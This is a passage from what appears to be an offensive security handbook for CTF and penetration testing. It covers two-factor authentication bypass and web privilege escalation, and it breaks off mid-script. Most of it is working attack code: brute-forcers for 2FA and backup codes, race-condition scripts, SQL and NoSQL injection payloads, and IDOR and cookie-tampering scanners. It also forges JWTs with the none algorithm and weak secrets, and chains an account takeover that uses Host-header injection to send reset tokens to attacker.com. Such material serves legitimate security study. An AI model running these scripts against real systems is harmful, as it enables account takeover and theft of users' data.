
### OAuth/Social Login 2FA Bypass

**Provider Confusion:**

```bash
# Account linked to multiple OAuth providers
# Some providers may not enforce 2FA

# Test flow:
1. Login via username/password → 2FA required
2. Login via Google OAuth → 2FA may be bypassed
3. Login via GitHub OAuth → 2FA may be bypassed

# Exploit: use provider with weakest security
```

**State Parameter Manipulation:**

```bash
# OAuth flow uses state parameter for CSRF protection

# Normal flow:
GET /oauth/login?provider=google
Redirect to Google with state=ABC123
Return to /oauth/callback?state=ABC123&code=XYZ

# Attack: manipulate state to bypass 2FA check
GET /oauth/callback?state=DIFFERENT_STATE&code=VALID_CODE

# If state validation weak
```

---

### Advanced Bypass Techniques

**Concurrency/Race Condition:**

```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor
import time

def race_condition_2fa(session_id, url):
    """
    Exploit race condition in 2FA validation
    
    Scenario: 
    - 2FA code validated in one request
    - Session upgraded in another
    - Race condition allows access before upgrade
    """
    
    def attempt_access():
        return requests.get(f'{url}/protected-resource',
                          cookies={'session': session_id})
    
    def submit_2fa():
        time.sleep(0.1)  # Small delay
        return requests.post(f'{url}/2fa-verify',
                           cookies={'session': session_id},
                           data={'code': 'VALID_CODE'})
    
    with ThreadPoolExecutor(max_workers=2) as executor:
        # Simultaneously access protected resource and submit 2FA
        future1 = executor.submit(attempt_access)
        future2 = executor.submit(submit_2fa)
        
        result1 = future1.result()
        result2 = future2.result()
        
        if result1.status_code == 200:
            print("[+] Race condition successful - accessed resource before 2FA")
            return True
    
    return False
```

**SQL Injection in 2FA Check:**

```sql
-- If 2FA verification uses SQL without proper sanitization

-- Normal check:
SELECT * FROM users WHERE username='victim' AND 2fa_code='123456'

-- Injection in code parameter:
POST /2fa-verify
data: code=' OR '1'='1

-- Query becomes:
SELECT * FROM users WHERE username='victim' AND 2fa_code='' OR '1'='1'

-- Bypasses 2FA check
```

**NoSQL Injection in 2FA:**

```javascript
// MongoDB example
// Normal query:
db.users.find({username: "victim", 2fa_code: "123456"})

// Injection:
POST /2fa-verify
Content-Type: application/json
{
  "username": "victim",
  "code": {"$ne": null}
}

// Query becomes:
db.users.find({username: "victim", 2fa_code: {$ne: null}})
// Returns true if any 2fa_code exists (even if wrong)
```

**JSON Parameter Manipulation:**

```bash
# Application expects JSON
POST /2fa-verify
Content-Type: application/json
{
  "username": "victim",
  "code": "123456",
  "verified": false
}

# Attacker adds extra parameter
{
  "username": "victim", 
  "code": "wrong",
  "verified": true
}

# If application blindly trusts client-sent "verified" field
```

**Mass Assignment Vulnerability:**

```python
# Test mass assignment in 2FA verification

import requests

# Normal request
data1 = {
    'username': 'victim',
    'code': 'wrong'
}

# Attack: add internal fields
data2 = {
    'username': 'victim',
    'code': 'wrong',
    '2fa_verified': True,
    'is_verified': 1,
    'verified': True,
    'status': 'verified'
}

response = requests.post('http://target.com/2fa-verify', json=data2)

# If backend model accepts and assigns extra fields
```

**IDOR in 2FA Verification:**

```bash
# Verify your own 2FA
POST /2fa-verify
{
  "user_id": 1,
  "code": "YOUR_VALID_CODE"
}

# Attempt to verify victim's account with your code
POST /2fa-verify
{
  "user_id": 999,
  "code": "YOUR_VALID_CODE"
}

# If code validation doesn't check user_id binding
```

---

### Testing Methodology

**Phase 1: Reconnaissance**

```bash
# Identify 2FA type
- TOTP (Google Authenticator, Authy)
- SMS
- Email
- Push notification
- Biometric
- Hardware token (YubiKey)

# Tools:
curl -v http://target.com/login
# Check response headers, HTML forms, JavaScript

# Identify backup methods
- Backup codes
- Alternative 2FA methods
- Account recovery process
```

**Phase 2: Flow Analysis**

```python
#!/usr/bin/env python3
import requests

def analyze_2fa_flow(base_url):
    """
    Map complete 2FA authentication flow
    """
    session = requests.Session()
    
    # Step 1: Login
    print("[*] Step 1: Login")
    r1 = session.post(f'{base_url}/login',
                     data={'username': 'test', 'password': 'test123'})
    print(f"    Status: {r1.status_code}")
    print(f"    Cookies: {session.cookies.get_dict()}")
    print(f"    Location: {r1.headers.get('Location', 'N/A')}")
    
    # Step 2: 2FA Challenge
    print("\n[*] Step 2: 2FA Challenge")
    r2 = session.get(f'{base_url}/2fa-verify')
    print(f"    Status: {r2.status_code}")
    
    # Step 3: Protected Resource (before 2FA)
    print("\n[*] Step 3: Access Protected Resource (before 2FA)")
    r3 = session.get(f'{base_url}/dashboard')
    print(f"    Status: {r3.status_code}")
    if r3.status_code == 200:
        print("    [!] Protected resource accessible without 2FA!")
    
    # Step 4: Submit 2FA
    print("\n[*] Step 4: Submit 2FA code")
    r4 = session.post(f'{base_url}/2fa-verify',
                     data={'code': '000000'})  # Wrong code
    print(f"    Status: {r4.status_code}")
    print(f"    Response: {r4.text[:200]}")
    
    return session

# Usage
analyze_2fa_flow('http://target.com')
```

**Phase 3: Vulnerability Testing**

```bash
# Test checklist:

# 1. Enforcement
[ ] Access protected resources without 2FA
[ ] Try all authentication endpoints (web, API, mobile)
[ ] Test OAuth/SSO flows

# 2. Code Properties
[ ] Code length and character set
[ ] Code expiration time
[ ] Code reusability
[ ] Multiple valid codes simultaneously

# 3. Rate Limiting
[ ] Brute force attempts before lockout
[ ] Rate limit bypass techniques (IP rotation, headers)
[ ] Account lockout behavior

# 4. Response Handling
[ ] Client-side vs server-side validation
[ ] Response manipulation
[ ] Error message information disclosure

# 5. Parameter Manipulation
[ ] User identifier manipulation
[ ] Additional parameter injection
[ ] SQL/NoSQL injection in verification

# 6. Session Handling
[ ] Session fixation
[ ] Session token manipulation
[ ] Cookie attribute testing

# 7. Backup Methods
[ ] Backup code enumeration
[ ] Alternative 2FA method weaknesses
[ ] Account recovery bypass
```

**Phase 4: Exploitation**

```python
#!/usr/bin/env python3
import requests
import sys

def exploit_2fa(target_url, username, password, method='direct_access'):
    """
    Automated 2FA bypass exploitation
    
    Methods:
    - direct_access: Skip 2FA verification
    - response_manipulation: Modify response
    - brute_force: Brute force codes
    - backup_codes: Try backup codes
    """
    
    session = requests.Session()
    
    # Login
    print(f"[*] Logging in as {username}")
    login_response = session.post(f'{target_url}/login',
                                  data={'username': username, 
                                        'password': password})
    
    if login_response.status_code != 200:
        print("[-] Login failed")
        return False
    
    print("[+] Login successful")
    
    if method == 'direct_access':
        print("[*] Attempting direct access bypass")
        dashboard = session.get(f'{target_url}/dashboard')
        if dashboard.status_code == 200 and "welcome" in dashboard.text.lower():
            print("[+] Direct access successful - 2FA bypassed!")
            return True
    
    elif method == 'brute_force':
        print("[*] Brute forcing 2FA codes")
        for code in range(0, 1000000):  # 6-digit codes
            code_str = str(code).zfill(6)
            verify_response = session.post(f'{target_url}/2fa-verify',
                                          data={'code': code_str})
            
            if verify_response.status_code == 200:
                print(f"[+] Valid code found: {code_str}")
                return True
            
            if code % 1000 == 0:
                print(f"[*] Progress: {code}/1000000")
    
    elif method == 'backup_codes':
        print("[*] Trying common backup code patterns")
        patterns = [
            lambda i: str(i).zfill(8),  # 8-digit
            lambda i: f"{str(i).zfill(4)}-{str(i+1).zfill(4)}",  # 4-4 format
        ]
        
        for pattern in patterns:
            for i in range(10000):
                code = pattern(i)
                verify_response = session.post(f'{target_url}/2fa-verify',
                                              data={'backup_code': code})
                if "success" in verify_response.text.lower():
                    print(f"[+] Valid backup code: {code}")
                    return True
    
    return False

# Usage example
if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("Usage: python script.py <url> <username> <password> [method]")
        sys.exit(1)
    
    target = sys.argv[1]
    user = sys.argv[2]
    pwd = sys.argv[3]
    method = sys.argv[4] if len(sys.argv) > 4 else 'direct_access'
    
    exploit_2fa(target, user, pwd, method)
```

---

### Defense Analysis (Understanding Protections)

Understanding defensive measures helps identify what to test:

**Proper 2FA Implementation:**

```python
# [Inference] Secure implementation characteristics:
- Server-side validation only
- Codes expire quickly (30-60 seconds)
- One-time use enforcement
- Strong rate limiting (3-5 attempts max)
- Codes cryptographically bound to user session
- All endpoints check 2FA status
- No fallback without equivalent security
- Logging and monitoring of 2FA attempts
```

**Rate Limiting Indicators:**

```bash
# Test rate limiting strength
for i in {1..10}; do
  echo "Attempt $i"
  curl -X POST http://target.com/2fa-verify \
    -d "code=000000" \
    -b "session=SESSION"
  sleep 1
done

# Look for:
- Account lockout after N attempts
- IP-based rate limiting
- Progressive delays
- CAPTCHA enforcement
```

**Session Security:**

```bash
# Check session attributes
curl -v http://target.com/login

# Look for secure cookie flags:
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict

# Test session fixation:
1. Get session cookie before login
2. Login with that cookie
3. Check if same cookie still valid after 2FA
```

---

### Tool Arsenal Summary

**Essential Tools:**

1. **Burp Suite**
    
    - Intercept and modify requests
    - Automate attacks with Intruder
    - Session handling macros
    - Response manipulation
2. **Python + Requests**
    
    - Custom exploitation scripts
    - Automated testing
    - Concurrent request handling
3. **FFUF/wfuzz**
    
    - Fast brute forcing
    - Parameter fuzzing
    - Response filtering
4. **SQLMap**
    
    ```bash
    # If 2FA check vulnerable to SQL injection
    sqlmap -u "http://target.com/2fa-verify" \
      --data="username=victim&code=123456" \
      --cookie="session=ABC123" \
      --level=5 --risk=3
    ```
    
5. **OWASP ZAP**
    
    - Automated scanning
    - Fuzzing capabilities
    - Spider for endpoint discovery
6. **Custom Scripts**
    
    - TOTP generators (pyotp)
    - Rate limit bypass tools
    - Session management

---

### CTF-Specific Scenarios

**Common CTF 2FA Challenges:**

**Scenario 1: Predictable Backup Codes**

```python
# Challenge: Backup codes follow pattern
# Example: Sequential or based on timestamp

def crack_backup_code(base_code):
    """
    If backup codes sequential or predictable
    """
    # Try variations
    variations = [
        int(base_code) + 1,
        int(base_code) - 1,
        int(base_code) + 10,
        int(base_code) * 2,
        # Add more patterns
    ]
    return [str(v).zfill(len(base_code)) for v in variations]
```

**Scenario 2: Client-Side 2FA Check**

```javascript
// JavaScript in page source
function verify2FA(code) {
  if (code === "123456") {  // Hardcoded!
    window.location.href = "/dashboard";
  }
}

// Or check in localStorage
if (localStorage.getItem('2fa_verified') === 'true') {
  // Allow access
}
```

**Scenario 3: Debug/Test Endpoints**

```bash
# Look for debug endpoints
GET /api/debug/bypass-2fa
GET /test/skip-verification
POST /admin/reset-2fa?user=victim

# Common in CTF environments
```

**Scenario 4: Timing Attack on TOTP**

```python
#!/usr/bin/env python3
import requests
import time
import statistics

def timing_attack_totp(url, session):
    """
    Measure response times to determine valid code
    [Inference] Valid codes may take longer to process (database lookup, etc.)
    """
    timings = {}
    
    for code in range(100000, 1000000, 1000):  # Sample range
        code_str = str(code).zfill(6)
        
        start = time.time()
        response = requests.post(url,
                               cookies={'session': session},
                               data={'code': code_str})
        elapsed = time.time() - start
        
        timings[code_str] = elapsed
        
    # Find outliers
    times = list(timings.values())
    mean = statistics.mean(times)
    stdev = statistics.stdev(times)
    
    for code, timing in timings.items():
        if timing > mean + (2 * stdev):
            print(f"[!] Suspicious timing for code {code}: {timing:.3f}s")
```

---

### Real-World Case Studies (Educational)

**Case Study 1: Instagram 2FA Bypass (Historical)**

```
[Unverified - for educational context]
Vulnerability: Race condition in 2FA verification
Method: Parallel requests to verification endpoint
Result: Multiple simultaneous requests could exhaust attempts counter
          allowing continued brute force
```

**Case Study 2: Snapchat 2FA Bypass (Historical)**

```
[Unverified - for educational context]
Vulnerability: SMS code not properly invalidated
Method: Code reuse across multiple sessions
Result: Single intercepted code could be used repeatedly
```

---

### Documentation & Reporting

**Vulnerability Report Template:**

```markdown
# 2FA Bypass Vulnerability

## Summary
Brief description of the vulnerability

## Severity
Critical / High / Medium / Low

## Affected Component
- URL: http://target.com/2fa-verify
- Parameter: code
- Method: POST

## Vulnerability Details
[Detailed explanation]

## Proof of Concept
1. Login with credentials: username=test, password=pass123
2. Intercept 2FA verification request
3. [Specific steps to reproduce]

## Impact
- Account takeover
- Unauthorized access to user data
- Complete authentication bypass

## Remediation
- Implement server-side validation
- Add rate limiting (max 3 attempts)
- Bind codes to session/user cryptographically
- Implement code expiration
- Add logging and monitoring

## References
[CVEs, articles, documentation]
```

---

## Combined Authentication Attack Chain

Real-world exploitation often combines multiple techniques:

**Attack Chain Example:**

```
1. Account Enumeration → Find valid username
2. Password Reset Flaw → Obtain password
3. Login → Session established
4. 2FA Bypass → Complete authentication

Detailed Flow:
├─ Step 1: Enumerate users via registration form
│  └─ Found: admin@target.com exists
├─ Step 2: Password reset with Host header injection
│  └─ Token received at attacker's server
├─ Step 3: Reset password to known value
│  └─ New password: hacked123
├─ Step 4: Login with compromised credentials
│  └─ Session cookie obtained
└─ Step 5: Bypass 2FA via direct access
   └─ Access /dashboard without 2FA verification
```

**Automated Chain Script:**

```python
#!/usr/bin/env python3
import requests

class AuthenticationBypass:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
    
    def enumerate_users(self, username_list):
        """Step 1: Find valid usernames"""
        print("[*] Enumerating users...")
        valid_users = []
        
        for username in username_list:
            response = self.session.post(f'{self.target}/register',
                                        data={'username': username,
                                              'email': f'{username}@test.com',
                                              'password': 'test123'})
            if "already exists" in response.text.lower():
                valid_users.append(username)
                print(f"[+] Found valid user: {username}")
        
        return valid_users
    
    def exploit_password_reset(self, email):
        """Step 2: Exploit password reset vulnerability"""
        print(f"[*] Exploiting password reset for {email}...")
        
        # Try host header injection
        response = self.session.post(f'{self.target}/reset-password',
                                    headers={'Host': 'attacker.com'},
                                    data={'email': email})
        
        if response.status_code == 200:
            print("[+] Reset request sent - check attacker.com for token")
            # In real scenario, extract token from attacker's server logs
            return "EXTRACTED_TOKEN"
        
        return None
    
    def reset_password(self, email, token, new_password):
        """Step 3: Complete password reset"""
        print("[*] Resetting password...")
        
        response = self.session.post(f'{self.target}/reset-confirm',
                                    data={'email': email,
                                          'token': token,
                                          'password': new_password})
        
        return response.status_code == 200
    
    def login(self, username, password):
        """Step 4: Login with compromised credentials"""
        print("[*] Logging in...")
        
        response = self.session.post(f'{self.target}/login',
                                    data={'username': username,
                                          'password': password})
        
        if response.status_code == 200:
            print("[+] Login successful")
            return True
        return False
    
    def bypass_2fa(self):
        """Step 5: Bypass 2FA"""
        print("[*] Attempting 2FA bypass...")
        
        # Try direct access
        response = self.session.get(f'{self.target}/dashboard')
        if response.status_code == 200:
            print("[+] 2FA bypassed via direct access!")
            return True
        
        # Try response manipulation
        # (In Burp, but can be simulated)
        
        # Try brute force backup codes
        for code in range(10000000, 10001000):  # Sample range
            response = self.session.post(f'{self.target}/2fa-verify',
                                        data={'backup_code': str(code)})
            if "success" in response.text.lower():
                print(f"[+] Valid backup code: {code}")
                return True
        
        return False
    
    def full_exploit(self, target_user):
        """Execute complete attack chain"""
        print(f"[*] Starting full authentication bypass chain for {target_user}")
        
        # Step 1: Verify user exists
        if not self.enumerate_users([target_user]):
            print("[-] User not found")
            return False
        
        # Step 2: Exploit password reset
        token = self.exploit_password_reset(f'{target_user}@target.com')
        if not token:
            print("[-] Password reset exploitation failed")
            return False
        
        # Step 3: Reset password
        new_pass = 'hacked123!'
        if not self.reset_password(f'{target_user}@target.com', token, new_pass):
            print("[-] Password reset failed")
            return False
        
        # Step 4: Login
        if not self.login(target_user, new_pass):
            print("[-] Login failed")
            return False
        
        # Step 5: Bypass 2FA
        if self.bypass_2fa():
            print("[+] Full authentication bypass successful!")
            return True
        
        print("[-] 2FA bypass failed")
        return False

# Usage
if __name__ == '__main__':
    target = 'http://ctf-challenge.com'
    bypass = AuthenticationBypass(target)
    bypass.full_exploit('admin')
```

This comprehensive coverage of authentication bypass techniques provides practical, actionable guidance for CTF challenges and security assessments. Each technique includes specific commands, tools, and exploitation strategies applicable in real-world scenarios.

---

# Privilege Escalation (Web Context)

## Horizontal Escalation to Admin

### Concept Overview

Horizontal privilege escalation occurs when an attacker accesses resources or functionality of another user at the same privilege level. In web contexts, this typically involves accessing another user's account, data, or actions.

**Common scenarios**:

- User A accesses User B's profile, orders, or messages
- Regular user accesses another regular user's resources
- Customer views another customer's data

### Insecure Direct Object References (IDOR)

**Basic IDOR exploitation**:

```python
import requests

# Authenticated session
session = requests.Session()
session.cookies.set('session', 'user123_token')

base_url = 'http://target.com'

# Test sequential user IDs
for user_id in range(1, 100):
    url = f"{base_url}/api/user/{user_id}"
    response = session.get(url)
    
    if response.status_code == 200:
        print(f"[+] Accessible user ID: {user_id}")
        print(f"    Data: {response.json()}")
    elif response.status_code == 403:
        print(f"[-] Forbidden: {user_id}")
    elif response.status_code == 404:
        print(f"[?] Not found: {user_id}")
```

**IDOR in different contexts**:

```python
import requests

class IDORTester:
    def __init__(self, session_cookie):
        self.session = requests.Session()
        self.session.cookies.set('PHPSESSID', session_cookie)
    
    def test_profile_access(self, base_url):
        """Test profile IDOR"""
        endpoints = [
            '/profile?id={}',
            '/user/{}',
            '/account/{}',
            '/api/users/{}',
            '/users/{}/profile',
        ]
        
        results = []
        
        for user_id in range(1, 50):
            for endpoint in endpoints:
                url = base_url + endpoint.format(user_id)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    # Check if response contains user data
                    if any(key in response.text.lower() for key in ['email', 'username', 'phone']):
                        results.append({
                            'user_id': user_id,
                            'url': url,
                            'data_snippet': response.text[:200]
                        })
                        print(f"[+] IDOR found: {url}")
        
        return results
    
    def test_document_access(self, base_url):
        """Test document/file IDOR"""
        endpoints = [
            '/download?file={}',
            '/documents/{}',
            '/files/{}/download',
            '/api/documents/{}',
        ]
        
        for doc_id in range(1, 100):
            for endpoint in endpoints:
                url = base_url + endpoint.format(doc_id)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '')
                    print(f"[+] Document accessible: {url}")
                    print(f"    Content-Type: {content_type}")
                    print(f"    Size: {len(response.content)} bytes")
    
    def test_order_access(self, base_url):
        """Test order/transaction IDOR"""
        endpoints = [
            '/order?id={}',
            '/orders/{}',
            '/api/orders/{}',
            '/invoice/{}',
            '/receipt/{}',
        ]
        
        for order_id in range(1000, 1100):
            for endpoint in endpoints:
                url = base_url + endpoint.format(order_id)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    if any(key in response.text.lower() for key in ['total', 'price', 'address']):
                        print(f"[+] Order accessible: {url}")

# Usage
tester = IDORTester('your_session_cookie_here')
tester.test_profile_access('http://target.com')
tester.test_document_access('http://target.com')
tester.test_order_access('http://target.com')
```

### Parameter Tampering

**User ID manipulation**:

```python
import requests

session = requests.Session()

# Login as regular user
login_data = {'username': 'user1', 'password': 'password123'}
session.post('http://target.com/login', data=login_data)

# Original request to view own profile
response = session.get('http://target.com/profile?user_id=5')
print(f"Own profile: {response.text[:100]}")

# Tamper with user_id parameter
response = session.get('http://target.com/profile?user_id=1')  # Admin typically ID 1
print(f"Admin profile: {response.text[:100]}")

# Try different parameter names
params_to_test = ['user_id', 'userid', 'uid', 'id', 'user', 'account_id']

for param in params_to_test:
    params = {param: '1'}
    response = session.get('http://target.com/profile', params=params)
    
    if 'admin' in response.text.lower():
        print(f"[+] Admin access via parameter: {param}")
```

**POST data manipulation**:

```python
import requests

session = requests.Session()
session.cookies.set('session', 'user_token')

# Normal update request
normal_data = {
    'user_id': '5',  # Current user
    'email': 'user@example.com',
    'phone': '1234567890'
}

# Attempt to modify admin account
attack_data = {
    'user_id': '1',  # Admin user
    'email': 'attacker@evil.com',
    'phone': '0987654321'
}

response = session.post('http://target.com/update-profile', data=attack_data)

if response.status_code == 200 and 'success' in response.text.lower():
    print("[+] Successfully modified admin profile!")
    print(f"Response: {response.text}")
```

### GUID/UUID Prediction

**Testing for predictable identifiers**:

```python
import requests
import uuid

session = requests.Session()
session.cookies.set('session', 'user_token')

# Test if UUIDs are sequential or predictable
known_user_uuid = "a1b2c3d4-e5f6-4789-a012-b3c4d5e6f7a8"

# Parse UUID
import uuid as uuid_lib
parsed = uuid_lib.UUID(known_user_uuid)

print(f"UUID version: {parsed.version}")
print(f"UUID variant: {parsed.variant}")

# If UUID v1, extract timestamp
if parsed.version == 1:
    timestamp = (parsed.time - 0x01b21dd213814000) / 10000000
    print(f"Timestamp: {timestamp}")

# Try incremental/decremental UUIDs
def modify_uuid(original_uuid, offset):
    """Attempt to generate adjacent UUIDs"""
    parts = original_uuid.split('-')
    last_part = int(parts[-1], 16)
    new_last = hex(last_part + offset)[2:].zfill(12)
    return '-'.join(parts[:-1] + [new_last])

for offset in range(-10, 10):
    test_uuid = modify_uuid(known_user_uuid, offset)
    url = f'http://target.com/api/user/{test_uuid}'
    response = session.get(url)
    
    if response.status_code == 200:
        print(f"[+] Valid UUID found: {test_uuid}")
```

### Session Token Manipulation

**Cookie tampering**:

```python
import requests
import base64
import json

session = requests.Session()

# Login as regular user
session.post('http://target.com/login', data={'username': 'user1', 'password': 'pass'})

# Extract session cookie
cookie_value = session.cookies.get('session')
print(f"Original cookie: {cookie_value}")

# Attempt to decode if base64
try:
    decoded = base64.b64decode(cookie_value)
    print(f"Decoded: {decoded}")
    
    # Try to parse as JSON
    try:
        session_data = json.loads(decoded)
        print(f"Session data: {session_data}")
        
        # Modify user_id to admin
        if 'user_id' in session_data:
            session_data['user_id'] = 1
        if 'role' in session_data:
            session_data['role'] = 'admin'
        
        # Re-encode
        modified = base64.b64encode(json.dumps(session_data).encode()).decode()
        print(f"Modified cookie: {modified}")
        
        # Test modified cookie
        session.cookies.set('session', modified)
        response = session.get('http://target.com/admin')
        
        if response.status_code == 200:
            print("[+] Admin access achieved!")
    except:
        pass
except:
    pass

# Try direct manipulation
modified_cookies = [
    cookie_value.replace('user', 'admin'),
    cookie_value.replace('5', '1'),  # User ID manipulation
    cookie_value.replace('role=user', 'role=admin'),
]

for modified in modified_cookies:
    session.cookies.set('session', modified)
    response = session.get('http://target.com/admin')
    
    if response.status_code == 200:
        print(f"[+] Success with cookie: {modified}")
```

### Mass Assignment Vulnerabilities

**Parameter injection**:

```python
import requests

session = requests.Session()
session.post('http://target.com/login', data={'username': 'user1', 'password': 'pass'})

# Normal profile update
normal_data = {
    'email': 'user@example.com',
    'phone': '1234567890'
}

# Attempt to inject additional parameters
attack_data = {
    'email': 'user@example.com',
    'phone': '1234567890',
    'role': 'admin',  # Injected
    'is_admin': 'true',  # Injected
    'admin': '1',  # Injected
    'privilege': 'administrator',  # Injected
    'account_type': 'admin',  # Injected
}

response = session.post('http://target.com/update-profile', data=attack_data)
print(f"Response: {response.status_code}")

# Verify if escalation worked
response = session.get('http://target.com/admin')
if response.status_code == 200:
    print("[+] Privilege escalation successful!")
```

**JSON-based mass assignment**:

```python
import requests
import json

session = requests.Session()
session.post('http://target.com/login', data={'username': 'user1', 'password': 'pass'})

# API request with injected fields
attack_payload = {
    'email': 'user@example.com',
    'phone': '1234567890',
    # Injected fields
    'role': 'admin',
    'isAdmin': True,
    'permissions': ['read', 'write', 'delete', 'admin'],
    'accountType': 'premium',
    'credits': 999999
}

headers = {'Content-Type': 'application/json'}
response = session.post('http://target.com/api/user/update', 
                       data=json.dumps(attack_payload),
                       headers=headers)

print(f"Response: {response.text}")

# Test various field combinations
fields_to_inject = [
    {'role': 'admin'},
    {'isAdmin': 'true'},
    {'admin': 1},
    {'user_role': 'administrator'},
    {'privilege_level': 99},
    {'access_level': 'full'},
]

for fields in fields_to_inject:
    payload = {'email': 'user@example.com'}
    payload.update(fields)
    
    response = session.post('http://target.com/api/user/update',
                          data=json.dumps(payload),
                          headers=headers)
    
    # Check if privilege escalated
    verify = session.get('http://target.com/api/user/me')
    if any(admin_indicator in verify.text.lower() 
           for admin_indicator in ['admin', 'administrator', 'superuser']):
        print(f"[+] Escalation successful with: {fields}")
        break
```

### Account Enumeration to Admin Discovery

**Username enumeration**:

```python
import requests

base_url = 'http://target.com'

# Common admin usernames
admin_usernames = [
    'admin', 'administrator', 'root', 'sysadmin', 'webadmin',
    'superadmin', 'admin1', 'admin123', 'test', 'demo',
    'support', 'help', 'manager', 'operator', 'moderator'
]

def check_username_exists(username):
    """Check if username exists via different methods"""
    
    # Method 1: Password reset
    response = requests.post(f'{base_url}/reset-password',
                           data={'username': username})
    
    if 'reset link sent' in response.text.lower():
        return True, 'password_reset'
    
    # Method 2: Registration
    response = requests.post(f'{base_url}/register',
                           data={'username': username, 'email': 'test@test.com'})
    
    if 'already exists' in response.text.lower():
        return True, 'registration'
    
    # Method 3: Login timing
    import time
    start = time.time()
    requests.post(f'{base_url}/login',
                 data={'username': username, 'password': 'wrongpassword'})
    elapsed = time.time() - start
    
    # Valid users might take longer to process
    if elapsed > 0.5:
        return True, 'timing'
    
    return False, None

print("[*] Enumerating admin accounts...")

valid_admins = []

for username in admin_usernames:
    exists, method = check_username_exists(username)
    
    if exists:
        print(f"[+] Found valid admin username: {username} (via {method})")
        valid_admins.append(username)
    else:
        print(f"[-] Invalid: {username}")

print(f"\n[+] Found {len(valid_admins)} potential admin accounts: {valid_admins}")
```

### JWT Token Manipulation for Horizontal Escalation

**JWT user ID manipulation**:

```python
import jwt
import json

# Captured JWT token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6InVzZXIifQ.signature"

# Decode without verification (to inspect)
try:
    decoded = jwt.decode(token, options={"verify_signature": False})
    print(f"Original token payload: {json.dumps(decoded, indent=2)}")
    
    # Modify user_id to target admin
    decoded['user_id'] = 1
    decoded['username'] = 'admin'
    
    print(f"\nModified payload: {json.dumps(decoded, indent=2)}")
    
    # Attack 1: None algorithm
    header = {"alg": "none", "typ": "JWT"}
    
    import base64
    header_encoded = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    payload_encoded = base64.urlsafe_b64encode(
        json.dumps(decoded).encode()
    ).decode().rstrip('=')
    
    none_token = f"{header_encoded}.{payload_encoded}."
    print(f"\nNone algorithm token: {none_token}")
    
    # Attack 2: Weak secret brute force
    weak_secrets = ['secret', 'password', 'key', '123456', 'admin', 'test']
    
    for secret in weak_secrets:
        try:
            forged_token = jwt.encode(decoded, secret, algorithm='HS256')
            print(f"\nToken with secret '{secret}': {forged_token}")
            
            # Test token
            import requests
            headers = {'Authorization': f'Bearer {forged_token}'}
            response = requests.get('http://target.com/api/user/1', headers=headers)
            
            if response.status_code == 200:
                print(f"[+] Valid secret found: {secret}")
                break
        except:
            pass

except Exception as e:
    print(f"Error: {e}")
```

## Vertical Escalation Techniques

### Concept Overview

Vertical privilege escalation occurs when a user gains access to functionality or resources that require higher privileges (e.g., regular user → admin, user → root).

### Hidden Admin Endpoints

**Directory and endpoint discovery**:

```python
import requests
from concurrent.futures import ThreadPoolExecutor

class AdminEndpointScanner:
    def __init__(self, base_url, session_cookie=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        if session_cookie:
            self.session.cookies.set('session', session_cookie)
    
    def check_endpoint(self, path):
        """Check if endpoint exists and is accessible"""
        url = f"{self.base_url}/{path}"
        
        try:
            response = self.session.get(url, timeout=5, allow_redirects=False)
            
            status = response.status_code
            length = len(response.content)
            
            # Interesting status codes
            if status in [200, 301, 302, 401, 403]:
                return {
                    'url': url,
                    'status': status,
                    'length': length,
                    'headers': dict(response.headers)
                }
        except:
            pass
        
        return None
    
    def scan(self, wordlist_file='/usr/share/seclists/Discovery/Web-Content/common.txt'):
        """Scan for admin endpoints"""
        
        admin_paths = [
            'admin', 'administrator', 'admin.php', 'admin.html',
            'admin/', 'admin/index.php', 'admin/login.php',
            'admin/dashboard', 'admin/panel', 'admin/cp',
            'administrator/', 'administrator/index.php',
            'adminpanel', 'admin_area', 'admin_panel',
            'controlpanel', 'control', 'cp', 'backend',
            'manage', 'management', 'manager',
            'webadmin', 'sysadmin', 'system',
            'adm', 'admin1', 'admin2',
            '_admin', '__admin', 'admin__',
            'secret', 'private', 'hidden',
            'api/admin', 'api/administrator',
            'v1/admin', 'v2/admin',
        ]
        
        results = []
        
        print(f"[*] Scanning {len(admin_paths)} admin endpoints...")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.check_endpoint, path) 
                      for path in admin_paths]
            
            for future in futures:
                result = future.result()
                if result:
                    status = result['status']
                    url = result['url']
                    length = result['length']
                    
                    indicator = "✓" if status == 200 else "⚠"
                    print(f"{indicator} [{status}] {url} ({length} bytes)")
                    
                    results.append(result)
        
        return results

# Usage
scanner = AdminEndpointScanner('http://target.com', session_cookie='user_token')
results = scanner.scan()

# Attempt to access found endpoints
for result in results:
    if result['status'] == 200:
        print(f"\n[+] Accessible admin endpoint: {result['url']}")
```

### Function-Based Privilege Escalation

**Hidden functionality discovery**:

```python
import requests
import re

class FunctionDiscovery:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
    
    def discover_js_endpoints(self):
        """Extract endpoints from JavaScript files"""
        js_files = []
        
        # Get main page
        response = self.session.get(self.base_url)
        
        # Find JS files
        js_pattern = r'<script[^>]+src=["\']([^"\']+\.js)["\']'
        js_files = re.findall(js_pattern, response.text)
        
        endpoints = set()
        
        for js_file in js_files:
            if not js_file.startswith('http'):
                js_url = f"{self.base_url}/{js_file.lstrip('/')}"
            else:
                js_url = js_file
            
            print(f"[*] Analyzing: {js_url}")
            
            try:
                js_response = self.session.get(js_url)
                js_content = js_response.text
                
                # Extract API endpoints
                api_patterns = [
                    r'["\']/(api/[^"\']+)["\']',
                    r'["\']/(admin/[^"\']+)["\']',
                    r'fetch\(["\']([^"\']+)["\']',
                    r'axios\.[a-z]+\(["\']([^"\']+)["\']',
                    r'\.get\(["\']([^"\']+)["\']',
                    r'\.post\(["\']([^"\']+)["\']',
                ]
                
                for pattern in api_patterns:
                    found = re.findall(pattern, js_content)
                    endpoints.update(found)
            
            except Exception as e:
                print(f"[-] Error analyzing {js_url}: {e}")
        
        return list(endpoints)
    
